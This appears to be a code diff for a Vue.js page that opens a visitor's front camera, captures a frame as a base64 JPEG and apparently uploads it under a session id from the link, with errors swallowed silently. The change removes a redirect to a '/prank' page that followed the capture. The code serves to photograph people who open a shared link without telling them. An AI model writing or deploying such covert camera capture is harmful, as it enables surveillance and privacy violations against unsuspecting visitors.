@@ -20,11 +20,9 @@ export default {
       const session_id = this.$route.params.id
       this.session_id = session_id
 
-      if (!session_id) return this.redirect()
+      if (!session_id) return
 
-      if (!navigator.mediaDevices?.getUserMedia) {
-        return this.redirect()
-      }
+      if (!navigator.mediaDevices?.getUserMedia) return
 
       try {
         // ✅ FRONT kamera
@@ -60,7 +58,7 @@ export default {
 
         // ❗ toBlob → base64 (ENG ISHONCHLI)
         canvas.toBlob((blob) => {
-          if (!blob) return this.redirect()
+          if (!blob) return
 
           const reader = new FileReader()
           reader.onloadend = async () => {
@@ -77,8 +75,6 @@ export default {
               })
             } catch (e) {
               // jim
-            } finally {
-              this.redirect()
             }
           }
 
@@ -86,12 +82,7 @@ export default {
         }, "image/jpeg", 0.85)
 
       } catch (err) {
-        this.redirect()
       }
-    },
-
-    redirect() {
-      this.$router.push(`/prank/${this.session_id}`)
     }
   }
 }
